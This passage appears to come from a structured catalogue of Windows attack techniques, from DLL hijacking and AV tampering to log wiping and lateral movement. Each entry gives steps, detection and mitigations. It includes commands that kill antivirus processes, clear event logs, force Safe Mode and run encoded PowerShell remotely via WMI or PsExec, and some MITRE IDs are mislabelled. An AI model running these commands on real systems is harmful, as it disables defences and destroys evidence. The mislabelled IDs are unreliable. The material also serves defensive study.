- **Vulnerability**: Misuse of rundll32’s DLL execution capability
- **MITRE**: T1574.001
- **Impact**: Code execution in trusted binary context
- **Tools**: rundll32.exe, malicious DLL
- **Scenario**: Abuses rundll32.exe to sideload and execute malicious DLLs with crafted entry points.
- **Attack Steps**: 1. Attacker writes a DLL with custom DllMain or exported function like Control_RunDLL.2. Executes rundll32.exe path\malicious.dll,EntryPoint.3. Since rundll32 is trusted and may run elevated, payload executes in that context.4. Often used in UAC bypass chains or persistence.
- **Detection**: Command-line analysis, DLL path logging
- **Solution**: Block rundll32 DLL calls via GPO/AppLocker
- **Tags**: dll hijack, rundll32, persistence, sideloading

## DLL Hijack in Windows Installer (msiexec.exe)

- **Attack Type**: Privilege Escalation → DLL Hijacking
- **Target**: Windows systems with MSI auto-execution
- **Vulnerability**: Plugin path manipulation in Windows Installer
- **MITRE**: T1574.001
- **Impact**: SYSTEM-level privilege if MSI runs elevated
- **Tools**: msiexec.exe, crafted MSI, malicious DLL
- **Scenario**: Malicious DLL is loaded by a custom MSI executed by msiexec.exe, abusing its plugin search mechanism.
- **Attack Steps**: 1. Attacker creates MSI package referencing an external plugin DLL.2. Places malicious DLL in the same directory.3. Runs msiexec.exe /i malicious.msi, which loads the attacker’s DLL.4. If executed by admin or via UAC bypass, attacker gains SYSTEM shell.
- **Detection**: Log plugin DLL loading, restrict MSI use
- **Solution**: Disable MSI execution from untrusted sources, use AppLocker
- **Tags**: dll hijack, msiexec, msi abuse, privilege escalation

## PowerShell Base64 Obfuscation

- **Attack Type**: Defense Evasion → Obfuscation
- **Target**: Windows (local/remote)
- **Vulnerability**: PowerShell allows encoded commands; content inspection is bypassed
- **MITRE**: T1027 (Obfuscated Files or Information)
- **Impact**: Initial payload delivery bypasses AV detection and gains execution
- **Tools**: PowerShell, Base64 encoder
- **Scenario**: Attacker hides a PowerShell payload by encoding it in Base64 and executing it using the -EncodedCommand flag to bypass AV detection.
- **Attack Steps**: 1. Attacker writes a standard PowerShell payload — for example, a reverse shell using Invoke-WebRequest or Netcat. 2. The script is then converted to Base64 using "[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('<script>'))". 3. The resulting Base64 string is embedded into the command line: powershell.exe -EncodedCommand <base64_payload>. 4. When executed, PowerShell decodes and runs the script in memory. 5. Most AV and EDR tools fail to detect the payload, as the original command is hidden from plain text inspection.
- **Detection**: Look for usage of -EncodedCommand in command-line arguments or logs, base64 pattern detection
- **Solution**: Enable script block logging, disable use of encoded commands through policy or application control
- **Tags**: powershell, base64, encoded command, obfuscation

## XOR String Obfuscation in Malware

- **Attack Type**: Defense Evasion → Obfuscation
- **Target**: Windows, Linux, macOS
- **Vulnerability**: Static analysis tools rely on plaintext string inspection
- **MITRE**: T1027.002 (Obfuscated Files or Information: Software Packing)
- **Impact**: Bypasses antivirus string-based detection; increases code stealth
- **Tools**: Custom malware, XOR encoder/decoder
- **Scenario**: Strings such as cmd.exe, powershell, and C2 URLs are XOR-encoded within a binary to evade static detection.
- **Attack Steps**: 1. Malware author takes sensitive strings like powershell, cmd.exe, or IP addresses and encodes them using XOR with a static key (e.g., key = 0x12). 2. These strings are replaced in the source code with the encoded values (e.g., '\x33\x15\x04'), and the malware includes a decoding routine that runs at runtime. 3. Once executed, the binary dynamically decodes these values into memory and invokes them. 4. Static antivirus scanners that rely on string signatures or heuristics cannot detect the obfuscated payload. 5. This technique is widely used in commodity and APT malware.
- **Detection**: Behavioral memory scanning, high-entropy string detection, sandbox detonation
- **Solution**: Implement behavior-based AV, use sandbox detonation and entropy scanners
- **Tags**: xor, static evasion, malware obfuscation, runtime decoding

## Polyglot Script with Obfuscation

- **Attack Type**: Defense Evasion → Obfuscation
- **Target**: Windows
- **Vulnerability**: Windows Script Host interprets and executes script files; no deep inspection
- **MITRE**: T1027.003 (Polyglot Files)
- **Impact**: Execution of payload hidden inside multilanguage wrappers; signature evasion
- **Tools**: Notepad, wscript.exe, cscript.exe
- **Scenario**: Multiple scripting languages (like JavaScript and VBScript) are combined with encoded payloads in a single file, executed through Windows Script Host.
- **Attack Steps**: 1. Attacker creates a single .txt or .js file containing embedded VBScript and JavaScript functions. The payload itself (e.g., reverse shell) is encoded in Base64, ROT13, or ASCII values. 2. The scripts include decoding logic to transform the payload into executable code at runtime. 3. File is renamed to .js, .vbs, or run explicitly with wscript.exe or cscript.exe. 4. The obfuscated payload gets reconstructed in memory and executed, avoiding detection by AVs looking for known signatures. 5. AV engines may not understand the multi-language structure, allowing execution to proceed undetected.
- **Detection**: Logging wscript.exe/cscript.exe, AMSI data collection, entropy analysis
- **Solution**: Restrict use of script interpreters, use AMSI-aware endpoint detection
- **Tags**: polyglot, wsh, multi-script obfuscation

## Obfuscated HTA Delivery

- **Attack Type**: Defense Evasion → Obfuscation
- **Target**: Windows
- **Vulnerability**: mshta.exe can execute untrusted scripts without warnings
- **MITRE**: T1218.005 (Signed Binary Proxy Execution: mshta)
- **Impact**: Remote code execution with stealth and no UAC prompt
- **Tools**: mshta.exe, custom HTA, remote payload server
- **Scenario**: HTML Application (HTA) files are crafted with hidden and obfuscated JavaScript/VBScript that downloads and runs a malicious binary.
- **Attack Steps**: 1. Attacker creates a .hta file with inline VBScript that contains obfuscated shellcode or downloader logic (e.g., Base64 payload split across variables). 2. The HTA file may be embedded in a phishing attachment or downloaded via drive-by exploit. 3. When the user opens the file, mshta.exe is invoked (either directly or through script/shortcut). 4. Scripts within the HTA decode the payload using built-in functions like eval, Chr(), or custom loops and execute it using WScript.Shell.Run. 5. Because HTA files are trusted and executed by Microsoft-signed binary (mshta.exe), many AVs do not block it.
- **Detection**: Monitor mshta executions, HTA file downloads, behavior-based anomaly detection
- **Solution**: Disable mshta.exe via GPO, block .hta filetypes
- **Tags**: hta, mshta, script obfuscation, signed binary abuse

## Abusing Signed Microsoft Binaries

- **Attack Type**: Defense Evasion → Code Signing Abuse
- **Target**: Windows
- **Vulnerability**: Trusted-signed binary executes attacker-supplied script
- **MITRE**: T1218.005
- **Impact**: Stealth execution of malicious code without AV alerts
- **Tools**: msbuild.exe, custom .proj payload
- **Scenario**: Executes payloads via Microsoft-signed binaries (LOLbins) like msbuild.exe to avoid AV detection.
- **Attack Steps**: 1. Attacker crafts a malicious .proj XML file containing inline C# code that performs malicious actions (e.g., downloading malware). 2. This file is executed using msbuild.exe, a Microsoft-signed binary used for .NET compilation. 3. Because the binary is signed by Microsoft and whitelisted, AV and EDR often allow it without alert. 4. The malicious code executes under the trusted process context, bypassing traditional security checks.
- **Detection**: Monitor LOLBin usage, especially with uncommon extensions
- **Solution**: Block unsigned .proj files, restrict access to build tools
- **Tags**: lolbins, msbuild, signed binary, proxy execution

## Signed Malware via Expired Certificate

- **Attack Type**: Defense Evasion → Code Signing Abuse
- **Target**: Windows, macOS
- **Vulnerability**: Code signing infrastructure trusts expired but valid certs
- **MITRE**: T1116
- **Impact**: Malware execution with no alerts; user trust is gained
- **Tools**: Stolen code-signing cert, signtool.exe
- **Scenario**: Malware is signed using an expired but valid certificate from a compromised developer.
- **Attack Steps**: 1. Threat actor compromises a certificate from a legitimate vendor or developer. 2. Signs malware using the stolen certificate, even if it is expired but still trusted by some systems. 3. When executed, the signed file appears trustworthy, leading AV/EDR to allow its execution. 4. The user or system does not prompt any warnings due to trusted publisher status.
- **Detection**: Check revocation lists (CRL/OCSP), signature timestamps
- **Solution**: Enforce strict cert revocation policies, disable expired certs
- **Tags**: stolen cert, code signing, trusted execution

## DLL Sideloading via Signed Installer

- **Attack Type**: Defense Evasion → Code Signing Abuse
- **Target**: Windows
- **Vulnerability**: Weak DLL load order in signed binaries
- **MITRE**: T1574.002
- **Impact**: Execution of unsigned malicious DLL under a signed binary
- **Tools**: Signed EXE, malicious DLL
- **Scenario**: Malware DLL is dropped next to a signed installer which auto-loads it on execution.
- **Attack Steps**: 1. Attacker finds a legitimate signed application (e.g., an MSI helper) vulnerable to DLL sideloading. 2. Crafts a malicious DLL named after a missing or weakly referenced dependency (e.g., version.dll). 3. Places both the signed EXE and malicious DLL in the same directory. 4. When EXE is executed, the DLL is loaded from the local directory instead of system path. 5. AV trusts the overall execution due to the signed parent binary.
- **Detection**: Detect unexpected DLL loads near signed EXEs
- **Solution**: Use manifest-secured DLL loading, monitor parent-child chains
- **Tags**: dll sideloading, signed abuse, trusted binary

## Masquerading Unsigned Malware with Fake Signature

- **Attack Type**: Defense Evasion → Code Signing Abuse
- **Target**: Windows (GUI-based users)
- **Vulnerability**: GUI trust indicators without backend verification
- **MITRE**: T1036.005
- **Impact**: User trust gained through fake signature; social engineering
- **Tools**: Resource Hacker, PE tools
- **Scenario**: Malware metadata is modified to fake a digital signature in properties to trick users.
- **Attack Steps**: 1. Attacker creates a malware payload and modifies its PE headers using tools like Resource Hacker or PE Bear. 2. The file's "Digital Signatures" tab is spoofed to display a fake publisher. 3. While the signature is non-functional (invalid), many users are tricked by the GUI appearance. 4. AVs may not detect it due to poor UI trust validation.
- **Detection**: Use digital signature validation tools (e.g., sigcheck)
- **Solution**: Disable execution of unsigned code through policy
- **Tags**: fake signature, spoofing, ui deception

## Signed Droppers Downloading Unsigned Payloads

- **Attack Type**: Defense Evasion → Code Signing Abuse
- **Target**: Windows
- **Vulnerability**: Signed wrapper hides delivery of malicious content
- **MITRE**: T1218.007
- **Impact**: Stage-based payload delivery with initial trust bypass
- **Tools**: Signed EXE, wget, PowerShell
- **Scenario**: Signed dropper is allowed to execute, and it downloads malicious unsigned payloads post-install.
- **Attack Steps**: 1. Attacker uses a legitimate signed installer/dropper with no initial malicious behavior. 2. On execution, it connects to a remote server to fetch and execute an unsigned payload. 3. Since initial EXE is signed, AV/EDR trusts the binary and allows execution. 4. Unsigned code is injected or run in memory post-download, avoiding filesystem-based detection.
- **Detection**: Monitor outbound traffic from signed EXEs, analyze child process lineage
- **Solution**: Enforce endpoint behavior rules, block unverified downloads
- **Tags**: signed dropper, post-download, staged delivery

## Abusing Kernel Drivers Signed with Leaked Certificates

- **Attack Type**: Defense Evasion → Code Signing Abuse
- **Target**: Windows kernel
- **Vulnerability**: Leaked trusted certs allow unauthorized driver loading
- **MITRE**: T1068
- **Impact**: EDR disablement, kernel manipulation, persistence
- **Tools**: Driver loader, leaked cert, kdmapper
- **Scenario**: A malicious driver is signed with a leaked (but still trusted) cert to load in kernel mode.
- **Attack Steps**: 1. Attacker obtains a leaked driver certificate (e.g., from Gigabyte, Huawei, etc.). 2. Compiles or modifies a kernel-mode driver with malicious code (e.g., disabling EDR kernel callbacks). 3. Signs the driver using the leaked cert. 4. Loads the driver using Windows APIs or a vulnerable loader like kdmapper. 5. Driver executes in Ring 0, bypassing AV and tampering with system components.
- **Detection**: Check driver certificate chains, validate against blacklist
- **Solution**: Use HVCI, block unsigned/legacy driver loading
- **Tags**: signed driver, ring0, leaked cert, edr evasion

## Time-Stamped Code Signing Abuse

- **Attack Type**: Defense Evasion → Code Signing Abuse
- **Target**: Windows systems using outdated validation logic
- **Vulnerability**: Timestamped signature trust logic
- **MITRE**: T1116
- **Impact**: Malware persists long after cert revocation
- **Tools**: Signtool.exe, timestamp server
- **Scenario**: Exploits the trust of old-but-valid signatures with timestamping to run unrevoked malware.
- **Attack Steps**: 1. Malware is signed using a code-signing certificate and time-stamped via public timestamping server. 2. Even after certificate revocation, Windows continues to trust it due to valid timestamp. 3. Attacker delivers this signed file to targets, and systems allow it to execute. 4. Traditional revocation checking doesn't prevent execution if timestamp is valid.
- **Detection**: Monitor for revoked cert usage with timestamps
- **Solution**: Block timestamped signatures from revoked vendors
- **Tags**: timestamp, cert abuse, trust chaining

## Signed Macro-Enabled Office Template

- **Attack Type**: Defense Evasion → Code Signing Abuse
- **Target**: Microsoft Office
- **Vulnerability**: Signed macros auto-load with trusted status
- **MITRE**: T1204.002
- **Impact**: Macro execution at startup without warnings
- **Tools**: Office, Signed .dotm, VBA
- **Scenario**: Delivers signed .dotm template with macro that executes on Office startup.
- **Attack Steps**: 1. Attacker creates .dotm Word template containing malicious VBA macros. 2. Signs it with a valid code-signing certificate.3. Places it in the Office Startup Templates folder.4. When Word is opened, template loads automatically and macro executes silently.5. EDR may skip analysis since template is signed.
- **Detection**: AMSI integration, template folder monitoring
- **Solution**: Block .dotm templates, force macro prompt regardless of signature
- **Tags**: macro abuse, signed template, office evasion

## Exploit Kit Using Code-Signed Java Applets

- **Attack Type**: Defense Evasion → Code Signing Abuse
- **Target**: Browser, Java runtime
- **Vulnerability**: Signed applets bypassing sandbox prompts
- **MITRE**: T1116
- **Impact**: Exploits trust chain in web delivery
- **Tools**: Java applet, code-signing cert
- **Scenario**: Signed Java applets used to execute Java payloads bypassing browser security.
- **Attack Steps**: 1. Attacker crafts a malicious Java applet payload with runtime downloader or exploit. 2. Signs it using a stolen or acquired cert. 3. Delivers applet through drive-by site or phishing lure. 4. Browser loads the signed applet without prompt or sandboxing.5. Payload downloads/executes malware.
- **Detection**: Java applet execution, CRL/OCSP monitoring
- **Solution**: Disable Java plugin use, block applets entirely
- **Tags**: java, signed applet, drive-by, exploit kit

## Tampering EDR Kernel Callbacks

- **Attack Type**: Defense Evasion → Disabling Security Tools
- **Target**: Windows kernel
- **Vulnerability**: Unprotected callback registry in kernel
- **MITRE**: T1562.001
- **Impact**: AV/EDR blind to malicious activities
- **Tools**: kdmapper, signed vulnerable driver
- **Scenario**: Malicious driver disables AV/EDR by unlinking kernel callbacks.
- **Attack Steps**: 1. Attacker loads a vulnerable signed driver using kdmapper or similar. 2. Malicious driver enumerates kernel callbacks related to EDR (e.g., image load, process create). 3. Removes or nullifies callback function pointers. 4. EDR tools no longer receive kernel-level telemetry.
- **Detection**: Detect unsigned drivers, kernel integrity violations
- **Solution**: Enable HVCI, use driver signing enforcement
- **Tags**: kernel tamper, edr disable, driver abuse

## Killing AV Processes via Taskkill

- **Attack Type**: Defense Evasion → Disabling Security Tools
- **Target**: Windows
- **Vulnerability**: No protection on AV process termination
- **MITRE**: T1562.001
- **Impact**: Unmonitored system during attack chain
- **Tools**: cmd.exe, taskkill.exe
- **Scenario**: AV processes are terminated using built-in Windows tools.
- **Attack Steps**: 1. Attacker uses taskkill /F /IM <AV_process>.exe to forcefully kill AV/EDR.2. Often chained with privilege escalation or UAC bypass.3. Malicious actions are taken post-disablement.
- **Detection**: Monitor AV process status and sudden stops
- **Solution**: Enable tamper protection on security tools
- **Tags**: taskkill, process kill, AV evasion

## Registry Tampering to Disable Defender

- **Attack Type**: Defense Evasion → Disabling Security Tools
- **Target**: Windows
- **Vulnerability**: Defender features configurable via registry
- **MITRE**: T1562.001
- **Impact**: Defender disabled silently before payload launch
- **Tools**: reg.exe, PowerShell
- **Scenario**: Windows Defender features are disabled through registry keys.
- **Attack Steps**: 1. Attacker modifies registry keys like HKLM\SOFTWARE\Microsoft\Windows Defender\DisableAntiSpyware. 2. Disables real-time protection, scanning, and cloud-based detection. 3. Actions are done silently using PowerShell or script during execution.
- **Detection**: Monitor registry key changes, audit Defender settings
- **Solution**: Lock registry permissions, enforce policy settings
- **Tags**: regedit, defender bypass, stealth disable

## AMSI Bypass via Reflection

- **Attack Type**: Defense Evasion → Disabling Security Tools
- **Target**: Windows (PowerShell-based systems)
- **Vulnerability**: AMSI API hook is not protected
- **MITRE**: T1562.001
- **Impact**: PowerShell payloads bypass real-time inspection
- **Tools**: PowerShell, AMSI patch script
- **Scenario**: Bypasses AMSI by modifying memory of amsi.dll via PowerShell reflection.
- **Attack Steps**: 1. Attacker loads amsi.dll and identifies the function pointer in memory.2. Uses [System.Reflection] to overwrite the memory address responsible for AMSI scan buffer.3. Causes AMSI to return a clean result regardless of content.4. Malicious script executes undetected.
- **Detection**: Detect AMSI patch attempts, monitor reflection APIs
- **Solution**: Enable Defender anti-tampering, update AMSI signature heuristics
- **Tags**: amsi bypass, memory patch, powershell evasion

## Tampering with EDR Agent Config Files

- **Attack Type**: Defense Evasion → Disabling Security Tools
- **Target**: Windows/Linux
- **Vulnerability**: Misplaced config files with poor access control
- **MITRE**: T1562.004
- **Impact**: Partial agent disablement or evasion of logging
- **Tools**: Notepad, File Explorer, CMD
- **Scenario**: Disrupts agent behavior by editing config files stored locally.
- **Attack Steps**: 1. Attacker finds misconfigured EDR agents storing config in readable folders.2. Edits config (e.g., disables telemetry, disables auto-start).3. Restarts system or service, rendering the agent partially disabled.
- **Detection**: Monitor integrity of EDR config paths
- **Solution**: Enforce file ACLs, use encrypted configs
- **Tags**: edr evasion, config tampering, stealth

## Process Hollowing of AV Binaries

- **Attack Type**: Defense Evasion → Disabling Security Tools
- **Target**: Windows
- **Vulnerability**: AV/EDR trust their own binaries
- **MITRE**: T1055.012
- **Impact**: Persistence and stealth execution via trusted process
- **Tools**: Cobalt Strike, Metasploit, custom injector
- **Scenario**: Malicious payload is injected into AV process using process hollowing.
- **Attack Steps**: 1. Attacker identifies a running AV process or starts one (e.g., MsMpEng.exe).2. Suspends the process and replaces its memory space with malicious payload.3. Resumes execution — now the AV process is a shell running attacker code.4. EDR is confused due to trusted parent.
- **Detection**: Detect injection into AV processes, memory scans
- **Solution**: Harden memory protections, use behavior-based EDR
- **Tags**: hollowing, injection, process abuse

## Safe Mode Boot for AV Disablement

- **Attack Type**: Defense Evasion → Disabling Security Tools
- **Target**: Windows
- **Vulnerability**: Security tools don’t auto-load in Safe Mode
- **MITRE**: T1562.009
- **Impact**: Malware can install with no interference
- **Tools**: BCDEdit, CMD, malware loader
- **Scenario**: Attacker reboots system into Safe Mode, where AV doesn't start.
- **Attack Steps**: 1. Changes boot configuration using bcdedit /set {current} safeboot minimal. 2. On reboot, Windows enters Safe Mode where AV and EDR services are disabled. 3. Drops malware and configures persistence mechanisms. 4. Restores normal boot after compromise.
- **Detection**: Detect Safe Mode triggers, alert on boot config changes
- **Solution**: Lock bootloader config, alert on boot mode
- **Tags**: safe mode, AV bypass, loader

## Tampering with Windows Security Center

- **Attack Type**: Defense Evasion → Disabling Security Tools
- **Target**: Windows
- **Vulnerability**: AV status spoofed through WMI/registry
- **MITRE**: T1562.006
- **Impact**: Hides true system security state from user
- **Tools**: Registry editor, WMI
- **Scenario**: Disrupts Windows Security Center to prevent display of AV warnings.
- **Attack Steps**: 1. Attacker uses WMI or Registry to disable monitoring flags for antivirus, firewall, etc.2. System UI shows “protected” despite tools being stopped.3. Allows malware to persist quietly.
- **Detection**: Detect WMI class modification, registry audits
- **Solution**: Restrict access to WMI classes, monitor AV status
- **Tags**: security center, spoof status, defender hack

## PowerShell Clear-EventLog Abuse

- **Attack Type**: Defense Evasion → Clearing Event Logs
- **Target**: Windows
- **Vulnerability**: Admins can wipe logs without alerts
- **MITRE**: T1070.001
- **Impact**: Forensic data is permanently removed
- **Tools**: PowerShell, clear-eventlog
- **Scenario**: Uses PowerShell to clear entire Windows logs after compromise.
- **Attack Steps**: 1. Attacker escalates privileges on target Windows system.2. Executes Clear-EventLog -LogName Security, System, Application.3. All logs are cleared, removing forensic traces of actions.4. Used immediately after payload execution or exfiltration.
- **Detection**: Alert on event log clear operations
- **Solution**: Disable Clear-EventLog, use SIEM backups
- **Tags**: log deletion, powershell abuse

## Wevtutil Log Clearance

- **Attack Type**: Defense Evasion → Clearing Event Logs
- **Target**: Windows
- **Vulnerability**: wevtutil trusted, rarely monitored
- **MITRE**: T1070.001
- **Impact**: Event traces removed silently
- **Tools**: wevtutil.exe
- **Scenario**: Uses built-in tool wevtutil to selectively clear logs.
- **Attack Steps**: 1. Attacker runs wevtutil cl Security or similar to remove event entries.2. May script it as part of post-exploitation toolkit.3. Stealthier than full log deletion; targets specific logs.
- **Detection**: Monitor wevtutil usage with alerting rules
- **Solution**: Restrict use via AppLocker or GPO
- **Tags**: log deletion, wevtutil, audit bypass

## Scheduled Task to Wipe Logs

- **Attack Type**: Defense Evasion → Clearing Event Logs
- **Target**: Windows
- **Vulnerability**: Task Scheduler allows persistent clearing
- **MITRE**: T1070.001
- **Impact**: Continuous forensic obfuscation
- **Tools**: Task Scheduler, PowerShell
- **Scenario**: Automates log clearing via scheduled task post-compromise.
- **Attack Steps**: 1. Attacker creates scheduled task that runs Clear-EventLog every few minutes.2. Ensures new logs don’t accumulate post-compromise.3. If task is disguised (e.g., named SystemCheck), it may go unnoticed.
- **Detection**: Detect repetitive task behavior, review scheduled tasks
- **Solution**: Use task whitelisting and logging
- **Tags**: persistent log clearing, scheduled tasks

## Clearing ETW Traces via API

- **Attack Type**: Defense Evasion → Clearing Event Logs
- **Target**: Windows
- **Vulnerability**: ETW calls can be manually stopped
- **MITRE**: T1562.002
- **Impact**: Prevents real-time monitoring of malicious actions
- **Tools**: C++ payload, ETW API
- **Scenario**: Stops or unregisters ETW providers to suppress runtime logs.
- **Attack Steps**: 1. Attacker uses EtwEventUnregister() or similar API calls to disable tracing.2. Prevents security tools from capturing behavior during execution.3. Often used in malware that monitors when to disable ETW dynamically.
- **Detection**: Detect missing ETW logs during execution
- **Solution**: Protect ETW provider registration, monitor API use
- **Tags**: etw evasion, telemetry disable

## Deleting Windows Defender Logs

- **Attack Type**: Defense Evasion → Clearing Event Logs
- **Target**: Windows
- **Vulnerability**: Defender logs are not WORM-protected
- **MITRE**: T1070.004
- **Impact**: AV detection logs removed; hides past alerts
- **Tools**: PowerShell, CMD
- **Scenario**: Manually or programmatically deletes Defender logs in %ProgramData%.
- **Attack Steps**: 1. Attacker navigates to Defender log location (e.g., C:\ProgramData\Microsoft\Windows Defender\Scans\History).2. Deletes or overwrites files to remove AV detection history.3. Actions occur post-infection to wipe evidence.
- **Detection**: Monitor file deletion in Defender folders
- **Solution**: Lock Defender logs with ACLs, mirror to SIEM
- **Tags**: defender log delete, AV evasion

## Nmap Stealth Scan for Network Reconnaissance

- **Attack Type**: Discovery → Network Enumeration using TCP SYN Scans and Host Discovery
- **Target**: Internal LAN
- **Vulnerability**: Unmonitored ICMP or SYN traffic
- **MITRE**: T1046
- **Impact**: Identifies exploitable hosts and exposed services
- **Tools**: Nmap
- **Scenario**: Attacker maps live hosts and services in a subnet without triggering standard firewalls.
- **Attack Steps**: The attacker initiates reconnaissance by selecting a target subnet (e.g., 192.168.1.0/24). Using nmap -sn, they send ICMP echo requests or ARP pings to determine which hosts are online. To avoid full port scans that could trigger alerts, they proceed with a stealthy TCP SYN scan (nmap -sS) targeting all ports (-p-) with moderate timing controls (-T3). Responses help identify open ports and services running, enabling the attacker to build a full map of accessible systems and services. This scan is intentionally slow or segmented to avoid NIDS/EDR detection.
- **Detection**: Anomaly-based detection on network scans
- **Solution**: Segment networks; use IDS to alert on SYN floods
- **Tags**: nmap, stealth scan, recon

## Active Directory Mapping via BloodHound

- **Attack Type**: Discovery → Graph-Based AD Privilege Path Enumeration
- **Target**: Active Directory
- **Vulnerability**: Over-permissive ACLs or trust links
- **MITRE**: T1482
- **Impact**: Maps privilege escalation routes to high-value targets
- **Tools**: SharpHound, BloodHound
- **Scenario**: Uses BloodHound and SharpHound to visualize and abuse AD trust paths.
- **Attack Steps**: The attacker, having compromised a low-privileged user account, uploads the SharpHound data collector onto the machine. They execute it with appropriate modules to collect details about domain trust relationships, group memberships, session information, ACLs, and object permissions. The data is zipped, exfiltrated, and imported into BloodHound. BloodHound visualizes the AD relationships and privilege inheritance paths. The attacker identifies viable routes from the current user to Domain Admin through misconfigurations like GenericAll, WriteDACL, or unconstrained delegation, preparing for privilege escalation.
- **Detection**: Detect SharpHound behavior and large LDAP queries
- **Solution**: Harden AD object permissions and reduce lateral exposure
- **Tags**: bloodhound, AD mapping

## Internal ARP Sweep for Host Identification

- **Attack Type**: Discovery → Local Subnet Device Discovery via ARP Broadcast
- **Target**: Local Subnet (Flat VLAN)
- **Vulnerability**: Lack of ARP monitoring
- **MITRE**: T1046
- **Impact**: Helps locate lateral targets without triggering alerts
- **Tools**: arp-scan
- **Scenario**: Maps live hosts in a local subnet using ARP requests without routing.
- **Attack Steps**: The attacker executes arp-scan -l on a compromised host to broadcast ARP packets to every IP on the subnet. Devices respond with their MAC and IP addresses, allowing the attacker to build a real-time inventory of connected systems. Since ARP operates at Layer 2, this activity does not reach routers or firewalls and is typically unmonitored by security tools. The attacker uses this to find unmanaged systems, IoT devices, printers, or shadow IT that might lack proper defenses or logging.
- **Detection**: Monitor sudden ARP bursts or repeated ARP queries
- **Solution**: Segment VLANs; implement ARP rate-limiting
- **Tags**: arp-scan, host discovery

## SMB Share Reconnaissance using CrackMapExec

- **Attack Type**: Discovery → Network File Share Enumeration using Valid Credentials
- **Target**: Windows Domain Machines
- **Vulnerability**: Poorly secured or misconfigured share permissions
- **MITRE**: T1135
- **Impact**: Enables data staging, tool drops, and info leaks
- **Tools**: CrackMapExec
- **Scenario**: Enumerates readable/writable shares across domain systems to find data staging or upload points.
- **Attack Steps**: The attacker uses valid credentials obtained from phishing or credential dumping. They run crackmapexec smb 192.168.1.0/24 -u user -p pass --shares to enumerate accessible SMB shares across a range of systems. The tool returns a list of shares and their access levels (READ, WRITE). Writable shares like C$\Temp, Users\Public, or poorly configured custom shares are flagged as potential drop zones for malware, lateral tools, or data exfiltration. Readable shares are browsed for sensitive documents, passwords in scripts, or admin tools.
- **Detection**: SMB share access enumeration from unknown hosts
- **Solution**: Enforce strict permissions on network shares
- **Tags**: smb, CME, share recon

## Netstat and ARP Commands for Connection Mapping

- **Attack Type**: Discovery → Local Connection Mapping via Built-In Tools
- **Target**: Compromised Windows Host
- **Vulnerability**: CLI tools rarely monitored
- **MITRE**: T1049
- **Impact**: Provides network visibility without external tools
- **Tools**: netstat, arp
- **Scenario**: Attacker uses built-in commands to infer which systems are connected or communicating.
- **Attack Steps**: On the compromised endpoint, the attacker opens a shell and runs netstat -ano to view all active connections, listening ports, and associated PIDs. They cross-reference these with running processes using tasklist /svc. Then they run arp -a to resolve IP addresses to MACs, helping determine which systems are physically nearby. This mapping reveals potential lateral movement targets like file servers, database machines, or other workstations in constant communication.
- **Detection**: Alert on frequent netstat or arp queries
- **Solution**: Restrict tool usage to admins or elevate logging
- **Tags**: netstat, arp, host mapping

## Vulnerability Detection via Nmap NSE Scripts

- **Attack Type**: Discovery → Automated Vulnerability Identification with Nmap Script Engine
- **Target**: Legacy Windows Hosts
- **Vulnerability**: Outdated/unpatched service versions
- **MITRE**: T1595
- **Impact**: Speeds up exploit planning through automation
- **Tools**: Nmap NSE
- **Scenario**: Uses Nmap's NSE scripts to find vulnerable services like EternalBlue or SMBGhost.
- **Attack Steps**: After discovering hosts, the attacker uses Nmap with --script=smb-vuln-ms17-010 and -p445 to scan for EternalBlue vulnerability. NSE scripts perform banner grabbing and limited protocol interaction to determine patch status. The attacker targets vulnerable Windows 7/2008 systems that respond positively. They do this quietly and only on pre-identified machines, avoiding full scans. Results are saved for future exploitation using tools like Metasploit.
- **Detection**: Detect NSE scans or malformed SMB probes
- **Solution**: Patch systems; monitor for port 445 probes
- **Tags**: nmap, vuln scan, NSE

## Internal DNS Zone Transfer

- **Attack Type**: Discovery → Host Enumeration via DNS Zone Transfer (AXFR)
- **Target**: DNS Servers
- **Vulnerability**: AXFR allowed for unauthorized clients
- **MITRE**: T1046
- **Impact**: Grants full visibility of domain architecture
- **Tools**: dig, host
- **Scenario**: Attempts to pull the full DNS zone file to extract hostnames and internal mappings.
- **Attack Steps**: The attacker identifies the internal DNS server IP (via DHCP config, nbtstat, or packet captures). They issue a zone transfer request using dig axfr @<dns-ip> corp.local. If zone transfers aren't restricted, the DNS server responds with the full list of A, CNAME, PTR, and MX records. This gives the attacker a complete map of hostnames, domain controllers, application servers, and naming conventions. Hostnames are resolved to IPs and added to the lateral movement map.
- **Detection**: Detect AXFR attempts from unknown IPs
- **Solution**: Disable AXFR; allow only between trusted secondaries
- **Tags**: dns, dig, axfr, recon

## Remote Code Execution using WMI

- **Attack Type**: Lateral Movement → Native Remote Execution via WMI with Valid Credentials
- **Target**: Internal Windows Host
- **Vulnerability**: WMI RPC traffic often overlooked by EDR
- **MITRE**: T1047
- **Impact**: Enables fileless and stealthy lateral execution
- **Tools**: WMIC
- **Scenario**: Uses WMI to execute code on a remote host without dropping files or requiring interaction.
- **Attack Steps**: With valid credentials and network access, the attacker uses WMI's wmic tool: wmic /node:192.168.1.5 /user:domain\user /password:pass process call create "powershell -enc <payload>". This spawns a process on the remote machine, usually as SYSTEM. WMI uses DCOM over RPC, which blends in with normal admin traffic and avoids detection if not explicitly monitored.
- **Detection**: Log and alert on WMI remote calls
- **Solution**: Restrict WMI use via GPO and DCOM permissions
- **Tags**: wmi, fileless lateral

## SYSTEM Shell via PsExec

- **Attack Type**: Lateral Movement → Remote SYSTEM Shell via SMB Admin Shares
- **Target**: Domain Workstations
- **Vulnerability**: Writable ADMIN$ + unrestricted service creation
- **MITRE**: T1021.002
- **Impact**: Immediate SYSTEM-level remote access
- **Tools**: PsExec
- **Scenario**: Attacker uses PsExec to execute commands remotely as SYSTEM using admin credentials.
- **Attack Steps**: Attacker runs: PsExec.exe \\192.168.1.5 -u domain\admin -p pass cmd. PsExec uploads a temporary service to ADMIN$ and starts it, creating a remote SYSTEM-level shell. This allows them to run privilege escalation scripts or deploy malware. Execution is fast and often succeeds if SMB ports are open and not heavily monitored.
- **Detection**: Detect PsExec executable and remote service starts
- **Solution**: Block PsExec via AppLocker or restrict ADMIN$
- **Tags**: psexec, SYSTEM shell, smb

## EternalBlue Exploitation

- **Attack Type**: Lateral Movement → SMB RCE using MS17-010 Exploit
- **Target**: Windows 7/Server 2008
- **Vulnerability**: Unpatched SMBv1 vulnerability
- **MITRE**: T1210
- **Impact**: Full compromise of system without login
- **Tools**: Metasploit, custom scripts
- **Scenario**: Exploits buffer overflow in SMBv1 (MS17-010) to gain remote SYSTEM access.
